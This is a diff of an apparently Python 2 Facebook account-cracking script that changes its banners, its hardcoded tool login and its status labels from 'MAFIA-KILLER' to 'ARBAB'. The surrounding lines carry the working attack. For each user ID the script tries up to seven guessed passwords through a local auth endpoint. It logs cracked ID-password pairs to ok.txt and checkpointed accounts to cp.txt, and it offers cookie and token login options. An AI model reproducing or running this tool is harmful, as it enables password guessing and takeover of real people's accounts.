@@ -61,14 +61,11 @@ def jalan(z):
 ##### LOGO #####
 logo = """
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
-\033[1;96m          _____                     _ _ 
-\033[1;96m         / ____|                   | (_) ⚡
-\033[1;96m        | (___  _ __   ___  ___  __| |_  
-\033[1;96m         \___ \| '_ \ / _ \/ _ \/ _` | | 
-\033[1;96m         ____) | |_) |  __/  __/ (_| | |
-\033[1;96m        |_____/| .__/ \___|\___|\__,_|_|
-\033[1;96m               | |                      
-\033[1;96m               |_|   Aahil Updated 0.3                   
+\033[1;91m      __  __            __   _           
+\033[1;91m     |  \/  |   __ _   / _| (_)   __ _   
+\033[1;91m       | |\/| |  / _` | | |_  | |  / _` |  
+\033[1;91m       | |  | | | (_| | |  _| | | | (_| |  
+\033[1;91m     |_|  |_|  \__,_| |_|   |_|  \__,_|  GANGE                   
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
 """
 def tik():
@@ -89,12 +86,12 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-\033[1;97m        ___    ___   _   _ _____ _     
-\033[1;92m       / _ \  / _ \ | | | |_   _| | Updated✔ 
-\033[1;97m      / /_\ \/ /_\ \| |_| | | | | |    
-\033[1;92m      |  _  ||  _  ||  _  | | | | |    
-\033[1;97m      | | | || | | || | | |_| |_| |____
-\033[1;97m      \_| |_/\_| |_/\_| |_/\___/\_____/
+ ████╗░██████╗░██████╗░░█████╗░██████╗░
+██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+███████║██████╔╝██████╦╝███████║██████╦╝
+██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
+██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
+╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
                                                                
 
 """
@@ -109,15 +106,14 @@ jalan("\033[1;96m•◈•  \___ \|  ___/|  __| |  __| | |  | || |  ")
 jalan("\033[1;96m•◈•  ____) | |    | |____| |____| |__| || |_ ")
 jalan("\033[1;96m•◈• |_____/|_|    |______|______|_____/_____|")
  
-jalan("   \033[1;91m INDAIN USERZ USE ANY PROXY ")	
-jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	
+        
 
-jalan("   \033[1;93m Welcome to Aahil Creations ")
+jalan("   \033[1;93m Welcome to Arbab Creations ")
 
-jalan("\033[1;97m•◈•──────────•◈•\033[1;96mBlacktiger\033[1;96m•◈•──────────•◈•")
+jalan("\033[1;97m•◈•──────────•◈•\033[1;96mBlackMafia\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "Mafia"
+CorrectPassword = "Arbab"
 
 
 loop = 'true'
@@ -142,9 +138,9 @@ def masuk():
         print ''
  	print "\033[0;94m──────────────────────────────────────────────────────"
         time.sleep(0.03)
-	print "\033[0;97m [\033[0;90m01\033[0;97m]\033[0;96m\033[0;97m Login Menggunakan Cookies"
+	print "\033[0;97m [\033[0;90m01\033[0;97m]\033[0;96m\033[0;97m Login With Cookies"
         time.sleep(0.03)
-	print "\033[0;97m [\033[0;90m02\033[0;97m]\033[0;96m\033[0;97m Login Menggunakan Token"
+	print "\033[0;97m [\033[0;90m02\033[0;97m]\033[0;96m\033[0;97m Login With Token"
         time.sleep(0.03)
 	print "\033[0;97m [\033[0;90m03\033[0;97m]\033[0;96m\033[0;97m Login Manual"
         time.sleep(0.03)
@@ -454,14 +450,14 @@ def pilih_super():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt","a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass1)
+					print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass1)
 					cp = open("cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -471,14 +467,14 @@ def pilih_super():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt","a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass2)
+							print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass2)
 							cp = open("cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -488,14 +484,14 @@ def pilih_super():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt","a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass3)
+									print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass3)
 									cp = open("cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -505,14 +501,14 @@ def pilih_super():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt","a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass4)
+											print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass4)
 											cp = open("cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -522,14 +518,14 @@ def pilih_super():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
+												print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt","a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass5)
+													print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass5)
 													cp = open("cp.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
@@ -539,14 +535,14 @@ def pilih_super():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
+														print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt","a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass6)
+															print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass6)
 															cp = open("cp.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
@@ -556,14 +552,14 @@ def pilih_super():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
+																print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt","a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error"]:
-																	print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass7)
+																	print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass7)
 																	cp = open("cp.txt","a")
 																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
